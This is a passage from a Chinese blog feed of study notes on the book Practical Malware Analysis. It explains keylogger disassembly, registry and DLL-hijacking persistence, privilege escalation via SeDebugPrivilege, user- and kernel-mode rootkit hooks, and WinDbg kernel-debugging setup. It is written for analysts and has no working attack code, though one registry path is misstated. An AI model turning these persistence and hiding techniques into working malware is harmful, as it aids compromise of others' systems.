Explorer）。</p><blockquote><p>轮询击键记录器中的典型循环结构<br><a href="https://i.loli.net/2018/07/23/5b554852b3083.jpg" data-fancybox="group" data-caption="i" class="fancybox"><img alt="i" title="i" data-src="https://i.loli.net/2018/07/23/5b554852b3083.jpg" class="lazyload"></a></p></blockquote><blockquote><p>GetAsynckeyState和GetForegroundWindow 击键记录器的反汇编</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401162 call ds:GetForegroundWindow</span><br><span class="line">···</span><br><span class="line">00401272 push 10h ；nVirtKey Shift</span><br><span class="line">00401274 call ds:GetKeyState</span><br><span class="line">0040127A mov esi，dword_403308[ebx]</span><br><span class="line">00401280 push esi；vKey</span><br><span class="line">00401281 movsx edi，ax</span><br><span class="line">00401284 call ds:CetAsyncKeyState</span><br><span class="line">0040128A test ah，80h</span><br><span class="line">0040128D jz short 1oc_40130A</span><br><span class="line">0040128F push 14h；nvirtkey Caps Lock</span><br><span class="line">00401291 call ds:GetKeyState</span><br><span class="line">···</span><br><span class="line">004013EF add ebx，4</span><br><span class="line">004013F2 cmp ebx，368</span><br><span class="line">004013F8 j1 loc_401272</span><br></pre></td></tr></table></figure></div><p>在进入内部循环之前程序调用了GetForegroundwindow函数。内部循环开始后，立即使用GetKeyState检查Shift键的状态，函数GetKeyState是快速检查按键状态的方法，与GetAsyncKeyState一样，它不能记住在它被调用后，按键是否被按下。接下来，击键记录器用EBX来索引键盘上的按键数组。如果一个新的按键被按下，击键记录器在调用GetkeyState查看CapsLock是否被激活之后，记录击键。最后，递增EBX确保代码清单中的下一个按键被检查。一旦检查了92个（368/4）按键，内部循环就结束了，再次调用GetForegroundwindow进入新的内部循环。</p><blockquote><p>通过字符串列表识别击键记录器</p></blockquote><p>可以通过查看恶意代码的导入API来识别击键记录器的功能。也可以通过检查标志字符串列表来识别击键记录器的功能，对于使用导入函数混淆技术或者使用你未见过的击键记录器功能的恶意代码来说，这种技术特别有用。</p><h2 id="11x4-存活机制"><a href="#11x4-存活机制" class="headerlink" title="11x4 存活机制"></a>11x4 存活机制</h2><p>一旦恶意代码获取系统的控制权，它通常就会在系统中驻留很长一段时间，恶意代码的这种行为被称为存活。如果存活机制足够特别，它甚至能作为给定恶意代码的指纹。</p><h3 id="1-Windows注册表"><a href="#1-Windows注册表" class="headerlink" title="1. Windows注册表"></a>1. Windows注册表</h3><p>一些工具可以帮助你搜索恶意代码在注册表中的存活位置，例如Sysintermals的自动化程序，它可以帮你找出系统中所有的自动启动程序。像ProcMon这样的工具可以帮助你在执行基本的动态分析时，监控系统中的所有注册表修改。</p><blockquote><p>AppInit_DLL</p></blockquote><p>恶意代码编写者可以通过一个名为AppInit DLL特殊注册表项来让他们的DLL获得加载。AppInit_DLL中的DLL程序会在进程加载User32.dl时被加载。插入DLL路径到注册表Applnit_DLL，会让DLL程序获得加载机会。</p><p>AppInit_DLL的值存储在如下Windows注册表键中<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</code><br>Applnit_DLL值的类型是REG_SZ，它由空格分隔的字符串组成。很多进程都会加载User32.dll，这些进程也会加载Applnit DLL。恶意代码编写者通常只针对一个单独进程，但是AppInit DLL会被加载到多个进程中。因此，恶意代码编写者执行攻击负载（playload）前必须检查它运行在哪个进程中。这种检查通常在恶意DLL程序的DLLMain函数中完成。</p><blockquote><p>Winlogon Notify</p></blockquote><p>恶意代码编写者可以挂钩一个特殊的Winlogon事件，如登录、注销、关机以及锁屏，等等。这甚至可以允许恶意代码在安全模式下加载。下面注册表键中的注册表项包含Notify的值。<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows NT\CurrentVersion\Winlogon\</code><br>当winlogon.exe产生一个事件时，Windows系统会检查Notify注册表键来查找处理这个事件的DLL程序。</p><blockquote><p>SvcHost DLL</p></blockquote><p>所有服务都存在于注册表中，如果一个服务的注册表键被移除，则这个服务将不能启动。恶意代码经常作为一个服务安装，但是更多的时候作为一个可执行文件使用。安装的恶意代码作为swchost.exe的DLL来存活，这使得恶意代码可以与其他进程混淆，且更像标准的服务。</p><p>svchost.exe是从动态链接库中运行服务的通用主机进程，Windows操作系统通常同一时刻运行多个svchost.exe实例。每个实例包含一组服务，这些服务能够使开发、测试以及服务组管理变得更简单。</p><p>这些组被定义在下列的注册表位置（每个值代表一个不同的组）<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows NT\CurrentVersion\Svchost</code></p><p>服务被定义在下列的注册表位置<br><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName</code></p><p>Windows服务包含多个注册表值，其中多数提供关于服务的信息。例如DisplayName和Description。恶意代码编写者通常会设置有助于恶意代码混淆的值，例如NetWareMan，它提供访问文件和打印NetWare网络资源的服务。另外一个注册表值为ImagePath，它包含服务可执行文件的位置。以svuchost.exe DLL为例，这个注册表值包含<code>%SystemRoot%/System32/svchost.exe -k GroupName</code>。</p><p>所有的svchost.exe DLL包含拥有ServiceDLL值的Parameters键，这是恶意代码编写者设置恶意DLL程序的位置，Parameters键下另一个值start用来确定服务何时启动（恶意代码通常设置为系统引导时启动）。</p><p>Windows拥有很多预先定义的服务组，所以恶意代码通常不会创建一个新的服务组，因为新创建的服务组很容易被探测。相反，多数恶意代码会将其加入一个已经存在的组或者覆盖一个无关紧要的服务——经常使用netsvcs服务组中很少使用的服务。要识别这种技术，使用动态分析监视Windows的注册表，或者在反汇编中查找CreateServiceA函数。如果恶意代码修改这些注册表键，你就会知道它们使用了这种存活技术。</p><h3 id="2-特洛伊木马化（Trojanized）系统二进制文件"><a href="#2-特洛伊木马化（Trojanized）系统二进制文件" class="headerlink" title="2. 特洛伊木马化（Trojanized）系统二进制文件"></a>2. 特洛伊木马化（Trojanized）系统二进制文件</h3><p>利用这种技术，恶意代码能够修改系统的二进制文件，当被感染的二进制文件下次运行或者加载时，将会强制运行恶意代码。恶意代码编写者主要针对Windows系统正常操作时最常使用的二进制文件，而DLL是恶意代码编写者欢迎的目标。</p><p>恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码。这些修改补丁覆盖函数的开始代码或者覆盖其他一些并不影响特洛伊木马化DLL正常操作的代码。为了不影响二进制文件的正常操作，恶意的代码被加入到可执行文件的一个空节中。插入的代码通常用来加载恶意代码，插入的函数并不关心它被插入到被感染的DLL的何处。加载恶意代码后，为了让DLL的操作与插入前的代码一致，代码会跳转回原始的DLL程序。</p><p>检查一个受感染的系统时，我们会注意到系统的二进制文件rutils.dll没有预想的MD5哈希值，所以我们进一步调查。我们将可疑版本的rtutils.dll与干净版本的rutils.dll一同加载到IDAPro。比较它们的D11EntryPoint函数。不同之处十分明显：特洛伊木马化版本的rtutits.dl会跳转到其他位置。<br><a href="https://i.loli.net/2018/07/23/5b557303ce5cd.jpg" data-fancybox="group" data-caption="i" class="fancybox"><img alt="i" title="i" data-src="https://i.loli.net/2018/07/23/5b557303ce5cd.jpg" class="lazyload"></a></p><h3 id="3-DLL加载顺序劫持"><a href="#3-DLL加载顺序劫持" class="headerlink" title="3. DLL加载顺序劫持"></a>3. DLL加载顺序劫持</h3><p>DLL加载顺序劫持是一种简单隐蔽的技术，它允许恶意代码编写者在不使用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序。这种技术甚至不需要单独的恶意加载器，因为它有能力让Windows加载它。</p><blockquote><p>在WindowsXP上加载DLL的默认搜索顺序</p></blockquote><ol><li>加载应用程序的目录。</li><li>当前目录。</li><li>系统目录（使用GetsystemDirectory函数获取的路径，例如…/Windows/System32）。</li><li>16位子系统的系统目录（例如.…/Windows/System）。</li><li>Windows目录（使用GetwindowsDirectory获取的路径，例如.…/Windows）。</li><li>PATH环境变量里列出的目录。</li></ol><p>在WindowsXP系统中，利用KnownDLL注册表键可以跳过DLL的加载过程，这个注册表键保护一些特定的DLL位置列表，这些DLL通常位于…/Windows/System32/目录下。设计KnownDLL机制的目的是改善安全（恶意的DLL不能放到加载顺序的前面）和速度（Windows不需要默认搜索前面的列表），但是它仅包含一个较短的重要DLL列表。</p><p>DLL加载顺序劫持可以被/System32之外目录中的二进制文件利用，来加载/System32目录中未被KnownDLL保护的DLL程序。例如，/Windows目录下explorer.exe会加载/System32目录下的ntshrui.dll。由于ntshrui.dll并不是一个KnownDLL，所以遵循默认搜索顺序，另外，/Windows目录在/System32目录之前被搜索。如果恶意的DLL被命名为ntshrui.dll并放到/Windows目录，则它将被加载到合法DLL的位置。为了让系统正常运行，恶意DLL程序随后再加载真正的DLL。</p><p>/System32目录之外的二进制文件都容易受到这种攻击，其中explorer.exe约有50个易受攻击的DLL。此外，由于DLL递归导入的原因，很多DLL会加载其他的DLL，而这些DLL按照默认顺序加载，因此KnownDLL机制也不能得到充分的保护。</p><h2 id="11x5-提权"><a href="#11x5-提权" class="headerlink" title="11x5 提权"></a>11x5 提权</h2><p>多数提权攻击是利用本地系统已知漏洞或者0day漏洞进行攻击，其中多数可以在Metasploit Framework中找到（<a href="http://www.metasploit.com/" target="_blank" rel="noopener">http://www.metasploit.com/</a> ）。甚至，DLL加载顺序劫持也可以被用来执行特权操作。如果恶意DLL所在的目录是用户可写的，并且加载这个DLL的进程在一个高特权级上运行，那么恶意DLL就获得了提权。拥有提权操作的恶意代码比较罕见，但是分析人员应该能识别常见的提权方法。</p><p>有时，甚至当用户以本地管理员运行时，恶意代码还会要求提权。运行在Windows系统中的进程或者运行在用户级别，或者运行在系统级别。通常用户不能操纵系统级别的进程，即使他们是管理员。</p><h3 id="1-使用SeDebugPrivilege"><a href="#1-使用SeDebugPrivilege" class="headerlink" title="1. 使用SeDebugPrivilege"></a>1. 使用SeDebugPrivilege</h3><p>以用户权限运行的进程并没有任意访问系统一切资源的权限，也不能拥有这种权限。例如在远程进程中调用类似于TerminateProcess和CreateRemoteThread函数。恶意代码获得访问这些函数的权限的唯一方法是通过设置访问令牌的权限来开启SeDebugPrivilege.在Windows系统中，访问令牌（access token）是一个包含进程安全描述符的对象。安全描述符用来指定拥有者的访问权限。</p><p>SeDebugPrivilege特权作为一个系统级别调试的工具被创建，但是恶意代码编写者用它来获取系统进程拥有的所有权限。默认情况下，SeDebugPrivilege只赋给本地管理员账户，基本可以认为赋予用户SeDebugPrivilege权限就等于给予他们本地系统账户权限。普通的用户账号不能给自身赋予SeDebugPrivilege权限，它的这种请求会被拒绝。</p><h2 id="11x6-隐藏它的踪迹——用户态的Rootkit"><a href="#11x6-隐藏它的踪迹——用户态的Rootkit" class="headerlink" title="11x6 隐藏它的踪迹——用户态的Rootkit"></a>11x6 隐藏它的踪迹——用户态的Rootkit</h2><p>恶意代码经常不遗余力地对用户隐藏它的生存机制和正在运行的进程。常用来隐藏恶意代码行为的工具被称为Rootkit。</p><p>Rootkit有多种存在形式，但是大部分Rootkt通过修改操作系统内部的功能来工作。这种修改可以使恶意代码的文件、进程、网络连接以及其他资源对其他程序隐藏，这也使得反病毒产品、管理员以及安全分析人员难以发现它们的恶意活动。</p><p>一些Rootkt会修改用户态的应用程序，但大部分会修改内核，因为保护机制（例如入侵防护系统）都运行在内核层。当它们运行在内核层而不是用户层时，Rootkit和入侵防御机制都很有效。在内核层，Rootkit比在用户层更容易破坏操作系统。</p><p>处理用户态安装挂钩Rootkit的一种较好策略是：先确定挂钩的位置，然后找出挂钩都干了什么。</p><h3 id="1-IAT-Hook"><a href="#1-IAT-Hook" class="headerlink" title="1. IAT Hook"></a>1. IAT Hook</h3><p>IAT Hook是用户空间中一种经典的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接。这种挂钩方法修改导入地址表（IAT）或者导出地址表（EAT）。</p><p>IAT Hook是一种过时且容易探测的挂钩方式，因此现代的Rootkit都使用更高级的inline Hook方法代替。</p><h3 id="2-Inline-Hook"><a href="#2-Inline-Hook" class="headerlink" title="2. Inline Hook"></a>2. Inline Hook</h3><p>Inline Hook是通过覆盖导入DLL中APl函数的代码来实现的，所以它必须等到DLL被加载后才能执行。IAT Hook只简单地修改函数指针，但Inline Hook将修改实际的函数代码。</p><p>恶意Rootkit通常用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行。另外，Rootkit还可以通过改变函数的代码来破坏它或者改变它，而不是跳转到恶意代码。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第11章-恶意代码行为&quot;&gt;&lt;a href=&quot;#第11章-恶意代码行为&quot; class=&quot;headerlink&quot; title=&quot;第11章  恶意代码行为&quot;&gt;&lt;/a&gt;第11章  恶意代码行为&lt;/h1&gt;&lt;h2 id=&quot;11x1-下载器和启动器&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第四篇 恶意代码功能篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第10章  使用WinDbg调试内核</title>
    <link href="https://kabeor.github.io/%E7%AC%AC10%E7%AB%A0%20%20%E4%BD%BF%E7%94%A8WinDbg%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8/"/>
    <id>https://kabeor.github.io/%E7%AC%AC10%E7%AB%A0%20%20%E4%BD%BF%E7%94%A8WinDbg%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8/</id>
    <published>2018-09-01T16:00:00.000Z</published>
    <updated>2020-03-16T04:25:21.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第10章-使用WinDbg调试内核"><a href="#第10章-使用WinDbg调试内核" class="headerlink" title="第10章  使用WinDbg调试内核"></a>第10章  使用WinDbg调试内核</h1><p>本章将探索使用WinDbg进行内核调试和Rootkit分析的方法。</p><h2 id="10x1-驱动与内核代码"><a href="#10x1-驱动与内核代码" class="headerlink" title="10x1 驱动与内核代码"></a>10x1 驱动与内核代码</h2><p>Windows设备驱动简称为驱动，它让第三方开发商在Windows内核模式下运行代码。</p><p>由于驱动程序常驻内存，并且负责响应用户态应用程序的请求，因此分析它十分困难。另外，由于应用程序不直接与驱动程序通信，而是直接访问设备对象，向具体的物理设备发送请求，使得<br>驱动程序更加难以分析。设备对象由驱动程序创建和销毁，可以被用户态的程序直接访问，但它们并非一定是真实的物理设备。</p><p>为了系统能够正常工作，驱动程序必须加载到内核空间，这与DLL需加载到进程空间是同样的道理。当驱动首次被加载时，DriverEntry函数将被调用，这与DLLMain相似。</p><p>与DLL通过函数导出表提供其功能接口不同，驱动通过注册回调函数来提供功能。当用户态的应用程序请求一个服务时，这些回调函数将会被调用。回调函数在DriverEntry程序中被注册。</p><p>Windows会为每个驱动创建一个驱动对象，并以参数形式将其传给DriverEntry函数，DriverEntry函数用回调函数填充这个驱动对象。然后DriverEntry会创建一个可以被用户态应用程序访问的设<br>备对象，应用程序与驱动的交互请求都将通过这个设备对象进行。</p><p>考虑来自用户态应用程序的一个读数据请求。最终这个请求被发送到负责管理硬件并存储读入数据的驱动程序。首先，用户态应用程序应该获得该硬件设备的一个文件句柄，然后在该句柄上调<br>用函数ReadFile。接着内核将会处理ReadFile函数的请求，最终由驱动程序的回调函数来响应对I/O设备的读请求。</p><p>请求内核态恶意组件的最常见函数是DeviceIoControl，它是从用户态模块到内核设备的一种通用请求方法。使用该函数时，用户态应用程序传递一个任意长度的缓冲区数据作为输入，并且接<br>收一个任意长度的缓冲区数据作为输出。</p><p>用户态应用程序到内核态驱动的调用由操作系统完成，这种调用难以被跟踪．如图展示了请求从用户态程序发起并最终到达一个内核驱动的过程。从图中可以看出，请求由用户态程序发起，最后到达内核驱动。在发送到内核的请求中，一部分请求发送到设备驱动去控制硬件设备，而另外一部分仅仅影响一些内核的内部状态。<br><a href="https://i.loli.net/2018/07/22/5b545fac1cab8.jpg" data-fancybox="group" data-caption="im" class="fancybox"><img alt="im" title="im" data-src="https://i.loli.net/2018/07/22/5b545fac1cab8.jpg" class="lazyload"></a></p><p>恶意驱动通常不控制硬件设备，而是与Windows操作系统主要的内核组件ntoskrnl. exe、hal.dll进行交互。ntoskrnl.exe组件包含操作系统核心功能的代码，hal.dll包含与主要硬件设备交互的代码。恶意代码常通过从一个或者多个这样的内核组件中导入函数，来操纵内核。</p><h2 id="10x2-安装内核调试"><a href="#10x2-安装内核调试" class="headerlink" title="10x2 安装内核调试"></a>10x2 安装内核调试</h2><p>内核调试比起用户模式调试来说更加复杂，因为进行内核调试时，操作系统将被冻结，这种情况下不可能运行调试器。因此，调试内核的常用方法是使用VMware。</p><p>与用户态调试不同，内核调试需要一些初始化设置。首先需要设置虚拟操作系统并开启内核调试，然后配置VMware使虚拟机与宿主系统之间有一条虚拟化的串口，同时还应该配置宿主操作系统中的WinDbg。</p><p>虚拟操作系统的设置是编辑C:\boot.ini(Windows XP下请确保文件夹选项设置为显示隐藏文件)。该文件在系统中通常是隐藏的。建议在编辑boot.ini文件之前，为你的虚拟操作系统做一个快照，如果配置文件错误或者损坏了boot.ini，你可以使用快照还原系统。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[boot loader]</span><br><span class="line">timeout&#x3D;30</span><br><span class="line">default&#x3D;multi(0)disk(0)rdisk(0)partition(1)\WINDOWS</span><br><span class="line">[operating systems]</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)WINDOWS&#x3D;&quot;Microsoft Windows XP Professional&quot;   编号1</span><br><span class="line">&#x2F;noexecute&#x3D;optin &#x2F;fastdetect</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS&#x3D;&quot;Microsoft Windows XP Professional with Kernel Debugging&quot;   编号2</span><br><span class="line">&#x2F;noexecute&#x3D;optin &#x2F;fastdetect &#x2F;debug &#x2F;debugport&#x3D;COM1&#x2F;baudrate&#x3D;115200</span><br></pre></td></tr></table></figure></div><p>以Windows XP为例，代码中编号1处指明默认加载的操作系统。编号2处是为了设置内核调试而加入的一行。通常你系统中的boot.ini与编号1类似．</p><p>复制系统中boot.ini最后一行，然后粘贴到boot. ini中新的一行，除了你应该加入的附加选项<code>/debug /debugport=COMl /baudrate=115200</code>外．其他项均与上一行相同(不用考虑行上其他的元素，如<code>multi(0)disk(0)</code>，简单的完全复制，只需加入附加选项）。其中<code>/debug</code>标记代表开启内核调试，<code>/debugport=COM1</code>标记告诉系统使用哪个端口来连接调试系统与被调试系统，<code>/baudrate=115200</code>标记用来指定串口数据传输速率。在本例中，我们使用VMware创建的串口。为了方便识别开机系统选项，我们将第二启动项命为“Microsoft Windows XP Professional with Kernel Debugging”。</p><p>当下次开机运行你的虚拟操作系统时，系统会提供一个开启内核调试的选项’止你选择。另外，系统会给你30秒的时间，决定是否以调试模式启动系统。如果想要连接内核调试器（即WinDbg），你需要在每次开机时选择调试版本启动项。</p><p>下一步，需要设置VMware，在虚拟操作系统和宿主操作系统之间创建一个虚拟连接。为此，我们在VMware上添加一个新的设备来使用宿主系统中的一个命名管道上的串口。下面是添加设备的步骤：</p><p><strong>1. 单击VM-&gt;Settings．然后会弹出VMware设置对话框。</strong><br><strong>2. 在VMware设置对话框中，单击右下角的Add按钮，在弹出的设备类型选择窗口中选择Serial Port，然后单击下一步。</strong><br><strong>3. 在请求串口类型的对话框中，选择Output to Named Pipe，然后单击下一步。</strong><br><strong>4. 在接下来的窗口中，输入\.\pipe\com_1对管道进行命名，然后选择This end is the server和The other end is an application。</strong><br><strong>5. 选中Yield CPU on poll单选框。</strong></p><p><a href="https://i.loli.net/2018/07/22/5b5468e9c465b.jpg" data-fancybox="group" data-caption="enter description here" class="fancybox"><img alt="enter description here" title="enter description here" data-src="https://i.loli.net/2018/07/22/5b5468e9c465b.jpg" class="lazyload"></a></p><p>完成虚拟机的配置后启动虚拟机。在宿主操作系统中，使用下列步骤使WinDbg连接虚拟机并开始调试内核。<br><strong>1．启动WinDbg。</strong><br><strong>2．选择File—Kemel Debug．单击COM标签，然后输入文件名和先前在boot.ini文件中设置的波特率</strong></p><p>如果虚拟操作系统处于运行状态，调试器会在数秒内连接到虚拟机操作系统。如果虚拟操作系统没有运行，调试器将处于等待，直到虚拟操作系统启动，启动过程中调试器将连接到被调试系统。调试器连接后，为了更加全面地获取到调试过程发生的事件，建议在调试过程中启用详细信息输出功能。启用详细信息输出功能后，每当驱动程序被加载和卸载时，你将会得到通知。这些信息在某些情况下可以帮助你识别恶意驱动的加载。</p><h2 id="10x3-使用WinDbg"><a href="#10x3-使用WinDbg" class="headerlink" title="10x3 使用WinDbg"></a>10x3 使用WinDbg</h2><h3 id="1-从内存中读取"><a href="#1-从内存中读取" class="headerlink" title="1. 从内存中读取"></a>1. 从内存中读取</h3><p>WinDbg的内存窗口支持直接通过命令来浏览内存。命令d是用来读取如程序数据或堆栈等内存位置的命令。</p><blockquote><p>基本语法</p></blockquote><p><code>dx addressToRead</code><br>这里x是显示数据格式的一个选项。<br><a href="https://i.loli.net/2018/07/22/5b546adbe93c1.jpg" data-fancybox="group" data-caption="几种显示数据常用的方式" class="fancybox"><img alt="几种显示数据常用的方式" title="几种显示数据常用的方式" data-src="https://i.loli.net/2018/07/22/5b546adbe93c1.jpg" class="lazyload"></a></p><p>e命令使用方法相同，来改变内存的值<br><code>ex addressToWrite dataToWrite</code><br>其中x与dx命令中的x值相同</p><h3 id="2-使用算术操作符"><a href="#2-使用算术操作符" class="headerlink" title="2. 使用算术操作符"></a>2. 使用算术操作符</h3><p>WinDbg支持在命令行中使用简单的算术操作符，对内存和寄存器进行直接操作，如加(+)、减（-）、乘(* )、除(/)。在试图创建一个条件表达式断点时，命令行选项就如快捷方式一样好用。</p><p>命令dwo用来解引用一个32位的指针，并查看该指针代表地址的值。</p><h3 id="3-设置断点"><a href="#3-设置断点" class="headerlink" title="3. 设置断点"></a>3. 设置断点</h3><p>在WinDbg调试器中，bp命令用来设置基本断点。同时WinDbg也可以使用一些命令，这些命令可以在断点触发时、控制转给用户之前自动运行。使用go(g)命令在断点处执行一个动作后继续执行，而不用等待用户。</p><h3 id="4-列举模块"><a href="#4-列举模块" class="headerlink" title="4. 列举模块"></a>4. 列举模块</h3><p>在OllyDbg调试中，内存映射可以列举出所有内存段与加载模块，但是WinDbg却没有相似的功能。然而,WinDbg的lm命令可以列举出加载到进程空间的所有模块，包括用户模式下的可执行模块,DLL以及内核模式下的内核驱动，同时也会列举出每个模块的起始与结束地址。</p><h2 id="10x4-微软符号表"><a href="#10x4-微软符号表" class="headerlink" title="10x4 微软符号表"></a>10x4 微软符号表</h2><p>调试符号表提供了有限的源代码信息，来帮助理解汇编代码。微软提供的调试符号表中包含某些函数和变量的名字。</p><p>在这里所说的调试符号就是某个特定内存地址的一个名称，大多数调试符号提供一个地址名称来表示一个函数，也有一些地址名称表示数据地址。</p><h3 id="1-搜索符号"><a href="#1-搜索符号" class="headerlink" title="1. 搜索符号"></a>1. 搜索符号</h3><p>WinDbg中符号的格式如下所示<br><code>moduleName!symbolName</code></p><p>这种语法可以在任意一个拥有正常地址的地方使用。其中moduleName表示.exe、.dll或者.sys格式文件的文件名（不包括其扩展名）。symbolName是与这个地址相关联一个名字。然向，ntoskrnl.exe是一个特例，它的module Name是nt，而不是ntoskrnl。</p><p>bu命令允许你用符号在没有加载的代码中设置一个延迟断点。延迟断点是一个断点，仅当加载一个名字匹配的模块时，延迟断点才会被设置。</p><p>x命令允许你使用通配符来搜索函数或符号。</p><p>Ln用来列出最接近给定内存地址的符号，它可以用来确认指针指向的函数。</p><h3 id="2-查看结构信息"><a href="#2-查看结构信息" class="headerlink" title="2. 查看结构信息"></a>2. 查看结构信息</h3><p>微软符号也包含多个数据结构的类型信息，包括没有被公开的内部类型。对于恶意代码分析人员，这些信息非常有用，因为恶意代码经常操作未公开的数据结构。</p><h3 id="3-配置Windows符号表"><a href="#3-配置Windows符号表" class="headerlink" title="3. 配置Windows符号表"></a>3. 配置Windows符号表</h3><p>符号表依赖于被分析文件的具体版本，它们随着文件的更新或修复而改变。如果配置正确。WinDbg将查询微软的服务器，自动获得正在调试文件的正确符号表。你可以通过选择File-&gt;Symbol File Path，来设置符号文件路径。为了配置WinDbg，让其使用在线符号服务器，输入以F路径：<br><code>SRV*c:\websymbols*http://msdl.microsoft.com/download/symbols</code><br>SRV配置了一个服务器，路径C:\websymbols是符号信息的本地缓存，网址则是微软符号服务器的<br>固定位置。</p><p>如果要调试的机器并不能一直连接互联网，你可以根据你使用操作系统、服务包、机器的体系结构等信息，手动从微软服务器下载指定的符号包。符号文件通常有几百兆大小，因为它们包含操作系统和服务包的所有修改和补丁版本的符号信息。</p><h2 id="10x5-内核调试实践"><a href="#10x5-内核调试实践" class="headerlink" title="10x5 内核调试实践"></a>10x5 内核调试实践</h2><p>对于恶意代码编码者，从内核空间写文件的好处是更加难以被觉察。虽然不是以秘密方式写入一个文件，但是它可以绕过一些安全产品，同时也可以误导那些试图查找用户空间中CreateFile、WriteFile函数调用证据的恶意代码分析师。呈现在恶意代码编写者面前的一个挑战是：在内核模式中，普通Win32函数不能直接被调用。但在内核模式下有相似的函数，这些函数可以被内核态的恶意代码所使用。由于CreateFile和WriteFile函数在内核模式下不可用，所以内核模式下提供NtCreateFile和NtWriteFile函数作为替代。</p><h3 id="1-用户空间的代码"><a href="#1-用户空间的代码" class="headerlink" title="1. 用户空间的代码"></a>1. 用户空间的代码</h3><h3 id="2-内核模式的代码"><a href="#2-内核模式的代码" class="headerlink" title="2. 内核模式的代码"></a>2. 内核模式的代码</h3><h3 id="3-查找驱动对象"><a href="#3-查找驱动对象" class="headerlink" title="3. 查找驱动对象"></a>3. 查找驱动对象</h3><h2 id="10x6-Rootkit"><a href="#10x6-Rootkit" class="headerlink" title="10x6 Rootkit"></a>10x6 Rootkit</h2><p>Rootkit通过修改操作系统内部函数,来隐藏自己存在的痕迹。通过这种修改, Rootkit可以隐藏一个正在运行程序的文件、进程、网络连接以及其他资源。这使得其恶意活动难以被反病毒产品、管理员以及安全分析员发现。</p><p>现在大部分 Rootkit都是通过采用某种方式修改操作系统内核来工作的。尽管 Rootkit可以使用多种隐藏技术,但在实际应用中,系统服务描述表(SSDT: System Service Descriptor Table)挂钩技术的使用程度远远超过其他技术。这种技术已经有几年的历史,与其他 rootkits技术相比,它更容易被探测。然而,由于它容易理解、实现灵活且容易,因此到现在它依然被恶意代码所使用。</p><p>系统服务描述表(SSDT),也称为系统服务分发表,微软使用它来查找进入内核的系统调用,它通常不被第三方应用程序或者驱动程序访问。内核态代码只能被用户态的<br>SYSCALL、 SYSENTER或INT 0x2E指令来访问。当前 Windows版本( Windows XP之后)使用 SYSENTER指令,它从存储在寄存器EAX的函数代码中获取指令。</p><h3 id="1-Rootkit分析实践"><a href="#1-Rootkit分析实践" class="headerlink" title="1. Rootkit分析实践"></a>1. Rootkit分析实践</h3><blockquote><p>一个 Rootkit挂钩SSDT的例子</p></blockquote><p>分析一个假设已感染的系统,并认为系统已经安装有恶意驱动。</p><p>首先最直接的方式是检查SSDT是否被挂钩,在 WinDbg中通过存放在nt!KeServiceDescriptorTable表中的偏移量查看SSDT表。SSDT表中所有函数偏移量都应该指向位于NT模块地址范围内的函数,所以我们首先要做的工作就是获取NT模块的地址边界。如果 Rootkit挂钩了其中的某个函数,则这个函数指针可能不在NT模块的地址范围内。当我们检查SSDT时,应该观察其函数指针是否在NT模块的地址范围内。</p><h3 id="2-中断"><a href="#2-中断" class="headerlink" title="2. 中断"></a>2. 中断</h3><p>有时．Rootkit会使用中断来干扰系统事件。现代的处理器实现了用硬件方式触发软件事件的中断。系统发送一条命令到硬件，硬件处理完请求事件后会中断处理器。</p><p>有时，驱动或者Rootkit会利用中断来执行代码，驱动程序调用IoConnectlnterrupt函数为特定中断注册一个处理程序，然后为这个中断指定一个中断服务例程(ISR)，每当触发该中断时，系统都会调用注册的中断服务例程。</p><p>中断描述表(IDT)存储着ISR的信息，在WinDbg中可以通过lidt命令查看</p><p>如果中断位于一个没有名字、没有签名或可疑的驱动中,则表明存在 Rootkit或者恶意代码。</p><h2 id="10x7-加载驱动"><a href="#10x7-加载驱动" class="headerlink" title="10x7 加载驱动"></a>10x7 加载驱动</h2><p>假设你拥有一个恶意的驱动程序,但没有用户态应用程序安装它,这个时候就可以用如 OSR Driver Loader的加载工具来加载它。 OSR Driver Loader驱动加载器非常容易使用而且免费,但需要注册。一旦安装了 OSR Driver Loader,只需在它运行后指定需要加载的驱动,然后单击 